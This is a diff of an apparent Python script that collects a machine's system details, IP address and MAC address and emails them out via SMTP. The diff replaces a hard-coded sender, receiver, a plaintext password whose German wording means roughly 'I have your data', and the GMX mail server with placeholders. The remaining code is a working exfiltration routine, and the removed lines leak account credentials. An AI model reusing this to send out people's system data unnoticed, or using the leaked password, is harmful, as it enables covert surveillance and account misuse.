@@ -58,9 +58,9 @@ mac_info = get_mac_address()
 email_content = f"{system_info}\n{ip_info}\n{mac_info}"
 
 # E-Mail Konfiguration
-sender_email = "rickroll1@gmx.de"
-receiver_email = "emil.sonnenschein@t-online.de"
-password = "IchHabeDeineDaten@2024Nr2"
+sender_email = "YOUR EMAIL ADRESS HERE"
+receiver_email = "YOUR EMAIL ADRESS HERE"
+password = "YOUR EMAIL PASSWORD HERE"
 
 message = MIMEText(email_content)
 message["Subject"] = "System Information"
@@ -68,7 +68,7 @@ message["From"] = sender_email
 message["To"] = receiver_email
 
 # E-Mail senden
-with smtplib.SMTP("mail.gmx.net", 587) as server:
+with smtplib.SMTP("THE SMPT SERVER OF YOUR EMAIL PROVIDER HERE", 587) as server:
     server.starttls()
     server.login(sender_email, password)
     server.sendmail(sender_email, receiver_email, message.as_string())
